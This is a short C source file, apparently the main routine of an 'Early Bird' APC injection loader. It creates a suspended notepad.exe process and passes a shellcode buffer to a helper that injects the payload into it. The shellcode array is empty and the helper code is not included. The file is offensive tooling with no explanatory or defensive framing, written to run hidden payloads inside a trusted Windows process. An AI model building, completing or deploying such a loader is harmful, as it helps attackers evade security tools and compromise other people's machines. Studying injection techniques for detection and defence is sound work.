#include "EarlyBirdApcInjection.h"

#define TARGET_PROCESS L"C:\\Windows\\System32\\notepad.exe"

int main()
{

		UCHAR Shellcode[] = {
	
		};

	SIZE_T PayloadSize = sizeof(Shellcode);
	HANDLE ThreadHandle = NULL;
	HANDLE ProcessHandle = NULL;
	DWORD ThreadId = 0;

	if (!CreateSuspendedProcess(TARGET_PROCESS, &ProcessHandle, &ThreadHandle, &ThreadId))
	{
		WARN("Failed To Create a Suspended Process of %ls", TARGET_PROCESS);
		PRINT_ERROR("CreateSuspendedProcess");
		return 1;
	}

	if (!WritePayloadViaEarlyBirdInjection(ProcessHandle, ThreadHandle, ThreadId, Shellcode, PayloadSize))
	{
		WARN("Failed To Write Payload Via Early Bird Injection!");
		PRINT_ERROR("WritePayloadViaEarlyBirdInjection");
		return 1;
	}

	CHAR("Quit...");
	getchar();

	return 0;

}